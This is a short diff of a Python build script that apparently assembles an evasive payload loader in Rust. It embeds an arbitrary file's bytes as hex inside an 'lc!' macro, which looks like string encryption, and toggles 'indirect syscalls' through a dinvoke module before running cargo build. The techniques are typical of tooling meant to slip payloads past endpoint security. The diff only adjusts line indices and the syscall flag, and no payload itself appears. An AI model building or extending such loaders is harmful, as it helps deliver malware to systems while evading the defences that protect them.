@@ -20,21 +20,24 @@ if args.use_loader is not False:
 		with open(args.path, 'rb') as f:
 			hexdata = f.read().hex()
 
-		src[16] = '\tlet bytes = lc!("' + hexdata + '");\n'
+		src[13] = '\tlet bytes = lc!("' + hexdata + '");\n'
 
 		with open('Loader\\src\\lib.rs', 'w') as file:
 			file.writelines(src)
 
 	if args.use_syscalls is not False:
 		print("[+] Enabling indirect syscalls on the Loader.")
+		sys = "true"
+	else:
+		sys = "false"
 
-		with open('Loader\\dinvoke\\src\\lib.rs', 'r') as file:
-			dinvoke = file.readlines()
+	with open('Loader\\dinvoke\\src\\lib.rs', 'r') as file:
+		dinvoke = file.readlines()
 
-		dinvoke[17] = 'static mut USE_IND_SYS: bool = true;\n'
+	dinvoke[17] = 'static mut USE_IND_SYS: bool = ' + sys + ';\n'
 
-		with open('Loader\\dinvoke\\src\\lib.rs', 'w') as file:
-			file.writelines(dinvoke)
+	with open('Loader\\dinvoke\\src\\lib.rs', 'w') as file:
+		file.writelines(dinvoke)
 
 	print("[-] Building the Loader...")
 	ret = os.system('cmd /c "cd .\\Loader && cargo build --release"')
